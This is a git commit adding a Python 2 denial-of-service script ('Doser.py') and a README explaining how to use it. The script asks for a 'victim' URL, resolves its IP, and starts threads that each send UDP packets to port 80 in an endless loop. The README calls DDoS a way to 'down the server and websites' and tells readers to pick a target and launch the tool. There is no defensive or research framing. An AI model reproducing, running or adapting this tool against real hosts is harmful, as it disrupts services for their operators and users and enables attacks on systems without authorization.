ab4173f181d14e7ce378b220af119d5703f8dbb5
optichawk <59558775+optichawk@users.noreply.github.com>
2020-01-15 18:27:48 +0330

    Add files via upload

---
+++ Doser.py
@@ -0,0 +1,38 @@
+#Python2
+#RiTaX
+import time, socket, sys, thread
+
+print'''
+\033[92m                    ,,                                    
+`7MM"""Yb.        `7MM                                    
+  MM    `Yb.        MM                                  \033[0m  
+  MM     `Mb   ,M""bMM  ,pW"Wq.  ,pP"Ybd  .gP"Ya `7Mb,od8 
+  MM      MM ,AP    MM 6W'   `Wb 8I   `" ,M'   Yb  MM' "' 
+  MM     ,MP 8MI    MM 8M     M8 `YMMMa. 8M""""""  MM   \033[91m  
+  MM    ,dP' `Mb    MM YA.   ,A9 L.   I8 YM.    ,  MM     
+.JMMmmmdP'    `Wbmd"MML.`Ybmd9'  M9mmmP'  `Mbmmd'.JMML.                                            \n  
+\033[1m[+]\033[96mhttps://github.com/optichawk'''
+victim_addr = raw_input("\033[91mEnter The URL (example.com): ")
+thread_count = input("Enter the counts of thread you wish to launch: ")
+victim_ip = socket.gethostbyname(victim_addr)
+
+UDP_PORT = 80
+MESSAGE = "\033[92mDOS ATTACK!!!"
+print "\033[93mUDP target IP:", victim_ip
+print "UDP target port:", UDP_PORT
+time.sleep(3)
+
+def dos(i):
+	while True:	
+			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			sock.sendto(MESSAGE, (victim_ip, UDP_PORT))
+			time.sleep(1)
+			print "\033[93mPacket Sent!"
+		
+for i in xrange(thread_count):
+	try:
+	 thread.start_new_thread( dos , ("Thread-"+str(i),) )
+	except KeyboardInterrupt:
+			sys.exit(0)
+while 1:
+  pass
---
+++ README.md
@@ -0,0 +1,13 @@
+
+<p align="center">About Ddos</p>
+<br>
+<p> Ddos is one way for attacking to servers . In this way, hackers use some tools for sending a lot of packets for down the server and websites. Ddos means attacking to one server with a lot of people but, dos means attacking to server by one person. I advice that Ddos attack is better than dos for big websites.<p>
+<br>
+<p align="center">How We Use Ritax Ddoser</p>
+<br>
+<p>first of all, finding your target. Then type the website URL in the first part and Enter. After that type how many packet do you want to send and push enter. At the end, our tool show the ip and port of website and then start sending packet.</p>
+<br>
+Our github: https://github.com/optichawk
+
+
+
